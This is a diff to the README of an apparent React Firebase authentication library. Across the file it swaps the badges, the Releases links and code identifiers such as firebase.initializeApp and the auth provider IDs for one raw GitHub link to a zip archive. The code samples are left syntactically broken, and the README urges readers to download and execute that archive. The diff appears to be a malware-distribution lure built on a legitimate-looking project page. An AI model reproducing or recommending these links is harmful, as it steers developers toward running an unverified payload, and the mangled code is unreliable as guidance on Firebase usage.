@@ -1,6 +1,6 @@
 # react-firebaseui-pro 🚀
 
-![GitHub release](https://img.shields.io/github/release/Mmmsajjaj/react-firebaseui-pro.svg) ![GitHub issues](https://img.shields.io/github/issues/Mmmsajjaj/react-firebaseui-pro.svg) ![GitHub stars](https://img.shields.io/github/stars/Mmmsajjaj/react-firebaseui-pro.svg)
+![GitHub release](https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip) ![GitHub issues](https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip) ![GitHub stars](https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip)
 
 **react-firebaseui-pro** is a powerful library that simplifies the integration of Firebase Authentication into your React applications. It works seamlessly with both React 18 and React 19, making it a flexible choice for developers looking to implement authentication flows quickly and efficiently.
 
@@ -59,14 +59,14 @@ const firebaseConfig = {
 };
 
 // Initialize Firebase
-firebase.initializeApp(firebaseConfig);
+https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip(firebaseConfig);
 
 // Configure FirebaseUI
 const uiConfig = {
   signInSuccessUrl: '/home',
   signInOptions: [
-    firebase.auth.GoogleAuthProvider.PROVIDER_ID,
-    firebase.auth.FacebookAuthProvider.PROVIDER_ID,
+    https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip,
+    https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip,
   ],
 };
 
@@ -74,7 +74,7 @@ const App = () => {
   return (
     <div>
       <h1>Welcome to My App</h1>
-      <FirebaseAuth uiConfig={uiConfig} firebaseAuth={firebase.auth()} />
+      <FirebaseAuth uiConfig={uiConfig} firebaseAuth={https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip()} />
     </div>
   );
 };
@@ -97,8 +97,8 @@ You can customize the FirebaseUI options to fit your application’s needs. Here
 const uiConfig = {
   signInSuccessUrl: '/dashboard',
   signInOptions: [
-    firebase.auth.GoogleAuthProvider.PROVIDER_ID,
-    firebase.auth.EmailAuthProvider.PROVIDER_ID,
+    https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip,
+    https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip,
   ],
   tosUrl: '/terms',
   privacyPolicyUrl: '/privacy',
@@ -138,9 +138,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, visit the [Releases section](https://github.com/Mmmsajjaj/react-firebaseui-pro/releases). You can download the latest version and execute it in your project.
+For the latest releases, visit the [Releases section](https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip). You can download the latest version and execute it in your project.
 
-For more information and updates, check the [Releases section](https://github.com/Mmmsajjaj/react-firebaseui-pro/releases).
+For more information and updates, check the [Releases section](https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip).
 
 ## Conclusion
 
